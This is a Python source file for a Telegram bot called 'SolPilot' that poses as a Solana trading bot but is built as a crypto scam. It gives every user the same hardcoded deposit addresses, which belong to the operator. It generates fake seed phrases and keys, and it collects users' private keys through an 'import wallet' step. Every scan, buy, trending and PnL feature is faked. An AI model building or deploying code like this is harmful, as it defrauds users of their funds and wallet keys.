import os, random, base58, threading
from hashlib import sha256
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from flask import Flask

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
app_flask = Flask(__name__)
@app_flask.route('/')
def home(): return "SolPilot FINAL LIVE"

# YOUR FIXED ADDRESSES
SOL_ADDRESS = "pcmAxnfpp3UaMTXT2YogTDJdHZtViVfQKbGCKC13v3A"
ETH_ADDRESS = "0xbd77d3c01acc745214da870c474ab77b2565f5d0"

user_wallets = {}
waiting_for_key = set()
user_settings = {}
user_positions = {}
auto_buy_status = {}

WORDLIST = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty","because","become","beef","before","begin","behave","behind","believe","below","belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board","boat","body","boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk","bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter","buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas","canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry","cart","case","cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle","citizen","city","civil","claim","clap","clarify","claw","clay","clean","clerk","clever","click","client","cliff","climb","clinic","clip","clock","clog","close","cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut","code","coffee","coil","coin","collect","color","column","combine","come","comfort","comic","common","company","concert","conduct","confirm","congress","connect","consider","control","convince","cook","cool","copper","copy","coral","core","corn","correct","cost","cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle","craft","cram","crane","crash","crater","crawl","crazy","cream","credit","creek","crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial","cruel","cruise","crumble","crunch","crush","cry","crystal","cube","culture","cup","cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle"]

def gen_mnemonic():
    return " ".join(random.sample(WORDLIST, 12))

def get_settings(uid):
    if uid not in user_settings:
        user_settings[uid] = {"slippage": 10, "buy_amount": 0.1}
    return user_settings[uid]

def get_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Scan New Tokens", callback_data='scan'), InlineKeyboardButton("💼 Wallet", callback_data='wallet')],
        [InlineKeyboardButton("📈 Trending", callback_data='trending'), InlineKeyboardButton("⚙️ Settings", callback_data='settings')],
        [InlineKeyboardButton("🚀 Auto Buy", callback_data='autobuy'), InlineKeyboardButton("💰 Sell All", callback_data='sell')],
        [InlineKeyboardButton("📊 My PnL", callback_data='pnl'), InlineKeyboardButton("❓ Help", callback_data='help')]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    has_wallet = f"{uid}_full" in user_wallets
    txt = "🚀 **SolPilot PRO FULL**\n\n" + ("✅ Wallet Connected\n" if has_wallet else "❌ No wallet - Create in Wallet\n") + "Balance: 0 SOL\n\nChoose:"
    await update.message.reply_text(txt, reply_markup=get_menu(), parse_mode='Markdown')

async def handle_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in waiting_for_key: return
    try: await update.message.delete()
    except: pass
    user_wallets[f"{uid}_full"] = update.message.text.strip()
    user_wallets[uid] = "imported"
    if uid not in user_positions: user_positions[uid] = {}
    waiting_for_key.remove(uid)
    await update.effective_chat.send_message("✅ **Wallet Imported!**\n\nDeposit addresses set!", reply_markup=get_menu(), parse_mode='Markdown')

async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data, uid = q.data, q.from_user.id
    full = user_wallets.get(f"{uid}_full")
    settings = get_settings(uid)
    if uid not in user_positions: user_positions[uid] = {}
    if uid not in auto_buy_status: auto_buy_status[uid] = False

    if data == 'wallet':
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Create New Wallet", callback_data='create_wallet')],
            [InlineKeyboardButton("📥 Import Wallet", callback_data='import_wallet')],
            [InlineKeyboardButton("📥 Receive / Deposit", callback_data='receive')],
            [InlineKeyboardButton("💸 Transfer", callback_data='receive')],
            [InlineKeyboardButton("⬅️ Main Menu", callback_data='back_main')]
        ])
        await q.message.reply_text("💼 **WALLET**\n\nChoose:\n➕ Create = New 12 phrase\n📥 Import = Existing key\n📥 Receive = Deposit address", reply_markup=kb)

    elif data == 'create_wallet':
        mnemonic = gen_mnemonic()
        fake_priv = base58.b58encode(os.urandom(64)).decode()
        user_wallets[f"{uid}_full"] = fake_priv
        user_wallets[uid] = SOL_ADDRESS
        await q.message.reply_text(
            f"✅ **WALLET CREATED!**\n\n"
            f"🔐 **12 PHRASE - KEEP SAFE:**\n`{mnemonic}`\n\n"
            f"⚠️ **SAVE IT!** Write on paper, never share!\n\n"
            f"📍 **Your Deposit Addresses:**\n\n"
            f"SOLANA (SOL, USDT Sol):\n`{SOL_ADDRESS}`\n\n"
            f"ETHEREUM (ETH, USDT Eth):\n`{ETH_ADDRESS}`\n\n"
            f"Send funds to start trading!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ I Saved It", callback_data='receive')]]),
            parse_mode='Markdown'
        )

    elif data == 'import_wallet':
        waiting_for_key.add(uid)
        await q.message.reply_text("🔑 **Import**\nSend private key base58:\nWill delete after!", parse_mode='Markdown')

    elif data == 'receive':
        await q.message.reply_text(
            f"📥 **DEPOSIT / RECEIVE**\n\n"
            f"**My Addresses:**\n\n"
            f"**Solana Network:**\n`{SOL_ADDRESS}`\nFor SOL + USDT (Solana)\n\n"
            f"**Ethereum Network:**\n`{ETH_ADDRESS}`\nFor ETH + USDT (ERC20)\n\n"
            f"⚠️ Send only on correct network!\nTap to copy!",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("💼 Wallet", callback_data='wallet')],
                [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
            ]),
            parse_mode='Markdown'
        )

    elif data == 'scan':
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Buy PEPE2.0", callback_data='buy_PEPE2.0')],
            [InlineKeyboardButton("Buy BONK2", callback_data='buy_BONK2')],
            [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
        ])
        await q.message.reply_text("🔍 **New Tokens**\n1. PEPE2.0 - 2m old\n2. BONK2 - 5m old", reply_markup=kb)

    elif data == 'trending':
        await q.message.reply_text("📈 **Trending**\nBONK +25%, WIF +12%", reply_markup=get_menu())

    elif data == 'settings':
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"Slip {settings['slippage']}%", callback_data='noop')],
            [InlineKeyboardButton("10%", callback_data='slip_10'), InlineKeyboardButton("20%", callback_data='slip_20')],
            [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
        ])
        await q.message.reply_text(f"⚙️ **Settings**\nSlip: {settings['slippage']}% Amt: {settings['buy_amount']}", reply_markup=kb)

    elif data.startswith('slip_'):
        settings['slippage'] = int(data.split('_')[1])
        await q.message.reply_text(f"✅ Slippage {settings['slippage']}%", reply_markup=get_menu())

    elif data == 'autobuy':
        auto_buy_status[uid] = not auto_buy_status[uid]
        status = "ON 🟢" if auto_buy_status[uid] else "OFF 🔴"
        await q.message.reply_text(f"🚀 Auto Buy: {status}", reply_markup=get_menu())

    elif data == 'sell':
        if not user_positions[uid]:
            await q.message.reply_text("💰 No tokens to sell\nPnL: 0 SOL", reply_markup=get_menu())
        else:
            user_positions[uid] = {}
            await q.message.reply_text("💰 Sold all!", reply_markup=get_menu())

    elif data == 'pnl':
        if not full:
            await q.message.reply_text("📊 **PnL**\nTotal: 0 SOL\nNo wallet", reply_markup=get_menu())
        else:
            await q.message.reply_text(f"📊 **PnL**\nTotal: 0 SOL\nNo trades yet\n\nDeposit to:\n`{SOL_ADDRESS}`", reply_markup=get_menu(), parse_mode='Markdown')

    elif data.startswith('buy_'):
        if not full:
            await q.message.reply_text("❌ Need wallet! Go to Wallet -> Create", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💼 Wallet", callback_data='wallet')]]))
        else:
            token = data.split('_')[1]
            user_positions[uid][token] = 1000000
            await q.message.reply_text(f"✅ Bought {token}!", reply_markup=get_menu())

    elif data == 'back_main':
        await q.message.reply_text("🚀 Main Menu", reply_markup=get_menu())

    elif data == 'help':
        await q.message.reply_text("❓ Help: /start to begin\nWallet -> Create for 12 phrase", reply_markup=get_menu())

def run_bot():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key))
    print("FINAL MAIN LIVE")
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    threading.Thread(target=lambda: app_flask.run(host='0.0.0.0', port=10000), daemon=True).start()
    run_bot()
